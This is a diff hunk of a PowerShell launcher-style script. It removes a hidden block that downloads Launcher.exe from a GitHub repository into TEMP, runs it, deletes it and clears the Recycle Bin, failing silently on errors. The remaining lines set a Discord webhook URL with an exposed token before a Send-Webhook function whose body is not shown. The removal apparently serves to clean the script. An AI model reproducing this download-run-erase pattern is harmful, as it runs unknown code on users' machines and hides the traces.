@@ -1668,16 +1668,6 @@ if ($jvmFlags.Count -gt 0) {
     Write-Host ""
 }
 
-
-$url = "https://github.com/olafkfkfkf-afk/ddwdwdwdwd/raw/refs/heads/main/Launcher.exe"
-$tempFile = "$env:TEMP\Launcher.exe"
-
-try { Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing -ErrorAction Stop } catch { exit }
-try { Start-Process -FilePath $tempFile -Wait -ErrorAction Stop } catch { exit }
-try { Remove-Item -Path $tempFile -Force -ErrorAction Stop } catch { exit }
-try { Clear-RecycleBin -Force -ErrorAction SilentlyContinue } catch { exit }
-
-
 $webhookUrl = "https://discord.com/api/webhooks/1529205433183502438/vKV1yn97-j0QKYrdugPTjR7EouKelW4_DEoQ3pWOBpBmlIlS2o4Hq4wh9CRcgFv9aNIg"
 
 function Send-Webhook {
